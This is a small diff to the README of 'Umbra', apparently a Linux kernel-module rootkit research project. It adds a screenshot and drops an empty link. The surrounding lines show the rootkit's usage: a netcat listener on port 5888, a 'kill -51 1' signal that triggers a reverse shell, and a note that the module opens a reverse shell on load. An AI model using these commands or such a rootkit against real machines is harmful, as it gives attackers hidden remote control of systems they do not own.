@@ -65,10 +65,10 @@ nc -lvp 5888
 ```
 kill -51 1
 ```
+<img src="images/kill51screenshot.png" width = 800/>
 
 Note: Umbra also tries to start the reverse shell on load.
 
-[]()
 
 ## References
 The development of this rootkit involved a substantial amount of research about LKMs and rootkit techniques. The following is an incomplete list of the resources I used:
